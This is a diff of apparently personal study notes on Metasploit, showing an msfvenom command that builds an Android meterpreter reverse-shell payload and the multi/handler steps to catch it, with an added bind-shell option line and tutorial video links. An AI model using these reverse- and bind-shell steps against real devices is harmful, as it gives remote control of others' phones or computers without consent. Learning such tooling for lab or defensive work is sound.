@@ -10,14 +10,15 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST=...  LPORT=... R > ~/shell_cod
 stage 2:
 use exploit/multi/handler
 set payload <path/to/payload/payload_name>
+in case of bind_shell_tcp, write "set rhost <target ip>" and "set lport <port>"
 show options     -----    shows the missing fields
 set LHOST/LPORT=<input>
 exploit
 help    ------   show a list of commands of what we can do
 
 source:
-metasploit android = https://www.youtube.com/watch?v=YRm-St0bJhU&ab_channel=LoiLiangYang
-
+android = metasploit android = https://www.youtube.com/watch?v=YRm-St0bJhU&ab_channel=LoiLiangYang
+windows = https://www.youtube.com/watch?v=ivpmlbt729k&t=4s
 
 
 NMAPWORKS-----------------------------------------------------------------------------------------------------------------------------
